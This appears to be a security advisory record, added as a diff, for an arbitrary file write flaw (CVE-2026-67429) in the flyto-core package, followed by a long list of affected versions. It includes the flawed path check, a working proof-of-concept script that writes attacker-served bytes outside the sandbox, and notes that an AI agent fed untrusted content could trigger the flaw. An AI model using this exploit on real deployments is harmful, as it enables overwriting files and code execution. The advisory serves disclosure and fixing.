@@ -1,0 +1,369 @@
+advisory_id: GHSA-2956-977x-2w3r
+datasource_id: github_osv/GHSA-2956-977x-2w3r
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-2956-977x-2w3r/GHSA-2956-977x-2w3r.json
+aliases:
+  - CVE-2026-67429
+summary: |
+  Flyto2 Core: Arbitrary file write via image.download (and other file-writing modules)
+  ## Summary
+
+  `image.download` fetches a URL and writes the response to disk. It does not use the central path guard (`validate_path_with_env_config`, which confines writes to `FLYTO_SANDBOX_DIR`); instead it confines the output to `output_dir`, but `output_dir` is itself a caller parameter. Since the attacker sets both the target and the base it is checked against, the check is meaningless, and attacker-controlled bytes (the HTTP response) land at any absolute path the process can write.
+
+  ## Affected code
+
+  `src/core/modules/atomic/image/download.py`:
+
+  ```python
+  output_path = params.get('output_path')
+  output_dir  = params.get('output_dir', '/tmp')   # caller-controlled base
+  ...
+  base_real   = os.path.realpath(output_dir)
+  target_real = os.path.realpath(output_path)
+  if os.path.commonpath([base_real, target_real]) != base_real:
+      raise Exception('Invalid file path')          # base is attacker-chosen, so always passes
+  ...
+  content = await response.read()                   # attacker-hosted bytes
+  with open(target_real, 'wb') as f:
+      f.write(content)
+  ```
+
+  `commonpath` is used correctly, but the base is caller-supplied, so setting `output_dir='/'` passes any target. `file.write`, by contrast, uses `validate_path_with_env_config()` and stays inside `FLYTO_SANDBOX_DIR`.
+
+  This is not isolated to `image.download`. Most other file-writing modules write to a caller `output_path` with no path check at all: `image.convert`, `image.resize`, `image.crop`, `image.compress`, `image.rotate`, `image.watermark`, `image.qrcode_generate`, `document.excel_write`, `document.pdf_fill_form`, `document.word_to_pdf`, `document.pdf_to_word` and `browser.pagination`. Their content is format-constrained (a valid PNG/XLSX/SVG/PDF) but the path is fully attacker-chosen; `image.download` is the strongest because the bytes are arbitrary.
+
+  ## Reproduction
+
+  Save as `filewrite_poc.py`, run with `PYTHONPATH=src/src python filewrite_poc.py`. It sets `FLYTO_SANDBOX_DIR` to a sandbox dir and writes to a sibling directory outside it.
+
+  ```python
+  #!/usr/bin/env python3
+  import asyncio
+  import os
+  import tempfile
+  import threading
+  from http.server import BaseHTTPRequestHandler, HTTPServer
+
+  os.environ["FLYTO_ALLOWED_HOSTS"] = "localhost"   # let the content host pass the SSRF check
+  EVIL = b"#!/bin/sh\n# attacker-controlled content written outside the sandbox\necho pwned\n"
+
+  class Content(BaseHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200); self.send_header("Content-Type", "image/jpeg")
+          self.send_header("Content-Length", str(len(EVIL))); self.end_headers(); self.wfile.write(EVIL)
+      def log_message(self, *a): pass
+
+  async def run(mid, params):
+      from core.modules.registry import ModuleRegistry
+      try:
+          return ("RESULT", await ModuleRegistry.execute(mid, params=params, context={}))
+      except Exception as e:
+          return ("EXC", f"{type(e).__name__}: {e}")
+
+  async def main():
+      from core.modules.atomic import register_all
+      register_all()
+      threading.Thread(target=HTTPServer(("127.0.0.1", 8080), Content).serve_forever, daemon=True).start()
+      root = tempfile.mkdtemp(prefix="flyto_poc_")
+      sandbox = os.path.join(root, "sandbox"); os.makedirs(sandbox)
+      escape = os.path.join(root, "ESCAPE"); os.makedirs(escape)
+      os.environ["FLYTO_SANDBOX_DIR"] = sandbox
+      target = os.path.join(escape, "pwned")   # OUTSIDE the sandbox
+      print("A) file.write:", await run("file.write", {"path": target, "content": "x"}))
+      print("B) image.download:", await run("image.download", {
+          "url": "http://localhost:8080/x.jpg", "output_dir": escape, "output_path": target}))
+      print("file written outside sandbox?", os.path.exists(target))
+      if os.path.exists(target):
+          print("content:", open(target, "rb").read())
+
+  if __name__ == "__main__":
+      asyncio.run(main())
+  ```
+
+  Output:
+
+  ```
+  A) file.write:     ('EXC', 'ModuleError: [PATH_TRAVERSAL] Path escapes base directory: <root>/ESCAPE/pwned ...')
+  B) image.download: ('RESULT', {'ok': True, 'path': '<root>/ESCAPE/pwned', 'size': 79, ...})
+  file written outside sandbox? True
+  content: b'#!/bin/sh\n# attacker-controlled content written outside the sandbox\necho pwned\n'
+  ```
+
+  `file.write` refuses the out-of-sandbox path; `image.download` writes attacker bytes there. Reproduced through the running HTTP API as well.
+
+  ## Reachability (why this is not operator self-service)
+
+  `output_dir`, `output_path` and `url` are not supplied by the trusted operator. Every non-denylisted module is exposed to an AI agent through the generic `execute_module(module_id, params)` MCP tool (`core/mcp_handler.py`, `params` taken from the model's `arguments`) and to hosted-API clients, so these parameters are chosen by the LLM (which processes untrusted content) or a remote client. `FLYTO_SANDBOX_DIR` and the guard `file.write` uses exist specifically to confine file operations to a directory the caller cannot change; this module ignores that confinement and lets the caller pick both the target and the base it is checked against. Defeating a confinement control the vendor built is a bug, not intended behavior.
+
+  ## Impact
+
+  Write arbitrary content to an arbitrary path outside the operator's sandbox — overwrite config, drop a shell profile, cron job or `authorized_keys`, or replace a Python module, leading to code execution in typical deployments. The URL is SSRF-checked, so the attacker hosts the payload on their own public server (which the guard allows).
+
+  ## Suggested fix
+
+  Use `validate_path_with_env_config()` for every module that writes files, so all writes are confined to `FLYTO_SANDBOX_DIR` (a base the caller cannot change), never to a caller-supplied `output_dir`.
+impacted_packages:
+  - purl: pkg:pypi/flyto-core
+    affected_versions: vers:pypi/<2.26.7
+    fixed_versions: vers:pypi/2.26.7
+    affected_packages:
+      - pkg:pypi/flyto-core@1.0.0
+      - pkg:pypi/flyto-core@1.0.1
+      - pkg:pypi/flyto-core@1.0.2
+      - pkg:pypi/flyto-core@1.0.3
+      - pkg:pypi/flyto-core@1.0.4
+      - pkg:pypi/flyto-core@1.0.5
+      - pkg:pypi/flyto-core@1.0.6
+      - pkg:pypi/flyto-core@1.0.7
+      - pkg:pypi/flyto-core@1.0.8
+      - pkg:pypi/flyto-core@1.0.9
+      - pkg:pypi/flyto-core@1.1.0
+      - pkg:pypi/flyto-core@1.1.1
+      - pkg:pypi/flyto-core@1.2.0
+      - pkg:pypi/flyto-core@1.3.0
+      - pkg:pypi/flyto-core@1.4.0
+      - pkg:pypi/flyto-core@1.5.0
+      - pkg:pypi/flyto-core@1.5.1
+      - pkg:pypi/flyto-core@1.5.2
+      - pkg:pypi/flyto-core@1.5.4
+      - pkg:pypi/flyto-core@1.6.0
+      - pkg:pypi/flyto-core@1.6.1
+      - pkg:pypi/flyto-core@1.6.2
+      - pkg:pypi/flyto-core@1.6.3
+      - pkg:pypi/flyto-core@1.6.4
+      - pkg:pypi/flyto-core@1.6.5
+      - pkg:pypi/flyto-core@1.7.0
+      - pkg:pypi/flyto-core@1.7.1
+      - pkg:pypi/flyto-core@1.7.2
+      - pkg:pypi/flyto-core@1.7.3
+      - pkg:pypi/flyto-core@1.7.4
+      - pkg:pypi/flyto-core@1.7.5
+      - pkg:pypi/flyto-core@1.7.6
+      - pkg:pypi/flyto-core@1.7.7
+      - pkg:pypi/flyto-core@1.7.8
+      - pkg:pypi/flyto-core@1.7.9
+      - pkg:pypi/flyto-core@1.8.0
+      - pkg:pypi/flyto-core@1.8.1
+      - pkg:pypi/flyto-core@1.8.2
+      - pkg:pypi/flyto-core@1.8.3
+      - pkg:pypi/flyto-core@1.8.4
+      - pkg:pypi/flyto-core@1.8.5
+      - pkg:pypi/flyto-core@1.8.6
+      - pkg:pypi/flyto-core@1.8.7
+      - pkg:pypi/flyto-core@1.8.8
+      - pkg:pypi/flyto-core@1.8.9
+      - pkg:pypi/flyto-core@1.8.10
+      - pkg:pypi/flyto-core@1.8.11
+      - pkg:pypi/flyto-core@1.8.12
+      - pkg:pypi/flyto-core@1.8.13
+      - pkg:pypi/flyto-core@1.8.14
+      - pkg:pypi/flyto-core@1.8.15
+      - pkg:pypi/flyto-core@1.8.16
+      - pkg:pypi/flyto-core@1.8.17
+      - pkg:pypi/flyto-core@1.9.0
+      - pkg:pypi/flyto-core@1.11.0
+      - pkg:pypi/flyto-core@1.12.0
+      - pkg:pypi/flyto-core@1.13.0
+      - pkg:pypi/flyto-core@1.14.0
+      - pkg:pypi/flyto-core@1.14.1
+      - pkg:pypi/flyto-core@1.14.2
+      - pkg:pypi/flyto-core@1.15.0
+      - pkg:pypi/flyto-core@1.16.0
+      - pkg:pypi/flyto-core@1.16.1
+      - pkg:pypi/flyto-core@1.16.2
+      - pkg:pypi/flyto-core@1.16.3
+      - pkg:pypi/flyto-core@1.16.4
+      - pkg:pypi/flyto-core@1.16.5
+      - pkg:pypi/flyto-core@1.16.6
+      - pkg:pypi/flyto-core@1.16.7
+      - pkg:pypi/flyto-core@1.16.8
+      - pkg:pypi/flyto-core@1.16.9
+      - pkg:pypi/flyto-core@1.16.10
+      - pkg:pypi/flyto-core@2.0.0
+      - pkg:pypi/flyto-core@2.0.1
+      - pkg:pypi/flyto-core@2.0.2
+      - pkg:pypi/flyto-core@2.0.3
+      - pkg:pypi/flyto-core@2.0.4
+      - pkg:pypi/flyto-core@2.0.5
+      - pkg:pypi/flyto-core@2.1.0
+      - pkg:pypi/flyto-core@2.1.1
+      - pkg:pypi/flyto-core@2.1.2
+      - pkg:pypi/flyto-core@2.1.3
+      - pkg:pypi/flyto-core@2.1.4
+      - pkg:pypi/flyto-core@2.2.0
+      - pkg:pypi/flyto-core@2.2.1
+      - pkg:pypi/flyto-core@2.2.2
+      - pkg:pypi/flyto-core@2.3.0
+      - pkg:pypi/flyto-core@2.3.1
+      - pkg:pypi/flyto-core@2.4.0
+      - pkg:pypi/flyto-core@2.4.1
+      - pkg:pypi/flyto-core@2.4.2
+      - pkg:pypi/flyto-core@2.4.3
+      - pkg:pypi/flyto-core@2.4.4
+      - pkg:pypi/flyto-core@2.4.5
+      - pkg:pypi/flyto-core@2.4.6
+      - pkg:pypi/flyto-core@2.4.7
+      - pkg:pypi/flyto-core@2.5.0
+      - pkg:pypi/flyto-core@2.5.1
+      - pkg:pypi/flyto-core@2.5.2
+      - pkg:pypi/flyto-core@2.6.0
+      - pkg:pypi/flyto-core@2.6.1
+      - pkg:pypi/flyto-core@2.7.0
+      - pkg:pypi/flyto-core@2.7.1
+      - pkg:pypi/flyto-core@2.7.2
+      - pkg:pypi/flyto-core@2.7.3
+      - pkg:pypi/flyto-core@2.7.4
+      - pkg:pypi/flyto-core@2.7.5
+      - pkg:pypi/flyto-core@2.7.6
+      - pkg:pypi/flyto-core@2.8.0
+      - pkg:pypi/flyto-core@2.9.0
+      - pkg:pypi/flyto-core@2.10.0
+      - pkg:pypi/flyto-core@2.11.0
+      - pkg:pypi/flyto-core@2.12.0
+      - pkg:pypi/flyto-core@2.12.1
+      - pkg:pypi/flyto-core@2.12.2
+      - pkg:pypi/flyto-core@2.12.3
+      - pkg:pypi/flyto-core@2.12.4
+      - pkg:pypi/flyto-core@2.12.5
+      - pkg:pypi/flyto-core@2.12.6
+      - pkg:pypi/flyto-core@2.12.13
+      - pkg:pypi/flyto-core@2.12.15
+      - pkg:pypi/flyto-core@2.12.16
+      - pkg:pypi/flyto-core@2.12.17
+      - pkg:pypi/flyto-core@2.12.18
+      - pkg:pypi/flyto-core@2.12.19
+      - pkg:pypi/flyto-core@2.12.20
+      - pkg:pypi/flyto-core@2.12.21
+      - pkg:pypi/flyto-core@2.12.22
+      - pkg:pypi/flyto-core@2.12.23
+      - pkg:pypi/flyto-core@2.12.24
+      - pkg:pypi/flyto-core@2.12.25
+      - pkg:pypi/flyto-core@2.12.26
+      - pkg:pypi/flyto-core@2.12.27
+      - pkg:pypi/flyto-core@2.12.28
+      - pkg:pypi/flyto-core@2.13.0
+      - pkg:pypi/flyto-core@2.13.1
+      - pkg:pypi/flyto-core@2.13.2
+      - pkg:pypi/flyto-core@2.13.3
+      - pkg:pypi/flyto-core@2.13.4
+      - pkg:pypi/flyto-core@2.14.0
+      - pkg:pypi/flyto-core@2.15.0
+      - pkg:pypi/flyto-core@2.15.1
+      - pkg:pypi/flyto-core@2.15.2
+      - pkg:pypi/flyto-core@2.15.3
+      - pkg:pypi/flyto-core@2.16.1
+      - pkg:pypi/flyto-core@2.16.3
+      - pkg:pypi/flyto-core@2.16.4
+      - pkg:pypi/flyto-core@2.17.0
+      - pkg:pypi/flyto-core@2.17.1
+      - pkg:pypi/flyto-core@2.17.2
+      - pkg:pypi/flyto-core@2.17.3
+      - pkg:pypi/flyto-core@2.17.4
+      - pkg:pypi/flyto-core@2.17.5
+      - pkg:pypi/flyto-core@2.17.6
+      - pkg:pypi/flyto-core@2.17.7
+      - pkg:pypi/flyto-core@2.17.8
+      - pkg:pypi/flyto-core@2.18.0
+      - pkg:pypi/flyto-core@2.18.1
+      - pkg:pypi/flyto-core@2.18.2
+      - pkg:pypi/flyto-core@2.18.3
+      - pkg:pypi/flyto-core@2.18.4
+      - pkg:pypi/flyto-core@2.18.5
+      - pkg:pypi/flyto-core@2.18.6
+      - pkg:pypi/flyto-core@2.18.8
+      - pkg:pypi/flyto-core@2.18.9
+      - pkg:pypi/flyto-core@2.18.10
+      - pkg:pypi/flyto-core@2.18.11
+      - pkg:pypi/flyto-core@2.19.0
+      - pkg:pypi/flyto-core@2.20.0
+      - pkg:pypi/flyto-core@2.20.1
+      - pkg:pypi/flyto-core@2.20.2
+      - pkg:pypi/flyto-core@2.20.3
+      - pkg:pypi/flyto-core@2.20.4
+      - pkg:pypi/flyto-core@2.23.0
+      - pkg:pypi/flyto-core@2.23.1
+      - pkg:pypi/flyto-core@2.23.2
+      - pkg:pypi/flyto-core@2.23.3
+      - pkg:pypi/flyto-core@2.24.0
+      - pkg:pypi/flyto-core@2.24.1
+      - pkg:pypi/flyto-core@2.24.2
+      - pkg:pypi/flyto-core@2.24.3
+      - pkg:pypi/flyto-core@2.24.4
+      - pkg:pypi/flyto-core@2.25.0
+      - pkg:pypi/flyto-core@2.25.1
+      - pkg:pypi/flyto-core@2.25.2
+      - pkg:pypi/flyto-core@2.25.3
+      - pkg:pypi/flyto-core@2.25.4
+      - pkg:pypi/flyto-core@2.25.5
+      - pkg:pypi/flyto-core@2.25.6
+      - pkg:pypi/flyto-core@2.25.7
+      - pkg:pypi/flyto-core@2.25.8
+      - pkg:pypi/flyto-core@2.25.9
+      - pkg:pypi/flyto-core@2.25.10
+      - pkg:pypi/flyto-core@2.25.11
+      - pkg:pypi/flyto-core@2.25.12
+      - pkg:pypi/flyto-core@2.25.13
+      - pkg:pypi/flyto-core@2.25.14
+      - pkg:pypi/flyto-core@2.25.15
+      - pkg:pypi/flyto-core@2.25.16
+      - pkg:pypi/flyto-core@2.25.17
+      - pkg:pypi/flyto-core@2.25.18
+      - pkg:pypi/flyto-core@2.25.19
+      - pkg:pypi/flyto-core@2.25.20
+      - pkg:pypi/flyto-core@2.25.21
+      - pkg:pypi/flyto-core@2.25.22
+      - pkg:pypi/flyto-core@2.25.23
+      - pkg:pypi/flyto-core@2.25.24
+      - pkg:pypi/flyto-core@2.25.25
+      - pkg:pypi/flyto-core@2.25.26
+      - pkg:pypi/flyto-core@2.25.27
+      - pkg:pypi/flyto-core@2.26.0
+      - pkg:pypi/flyto-core@2.26.1
+      - pkg:pypi/flyto-core@2.26.2
+      - pkg:pypi/flyto-core@2.26.3
+      - pkg:pypi/flyto-core@2.26.4
+      - pkg:pypi/flyto-core@2.26.5
+    fixed_packages:
+      - pkg:pypi/flyto-core@2.26.7
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/flytohub/flyto-core
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/flytohub/flyto-core
+        commit: d5f89d71303e3c1e6418d347c5c55fcd173cc8cc
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '10.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-2956-977x-2w3r/GHSA-2956-977x-2w3r.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+  - CWE-73
+references:
+  - url: https://github.com/flytohub/flyto-core
+    reference_type:
+    reference_id:
+  - url: https://github.com/flytohub/flyto-core/commit/d5f89d71303e3c1e6418d347c5c55fcd173cc8cc
+    reference_type:
+    reference_id:
+  - url: https://github.com/flytohub/flyto-core/releases/tag/v2.26.6
+    reference_type:
+    reference_id:
+  - url: https://github.com/flytohub/flyto-core/security/advisories/GHSA-2956-977x-2w3r
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-67429
+    reference_type:
+    reference_id: CVE-2026-67429
+exploits: []
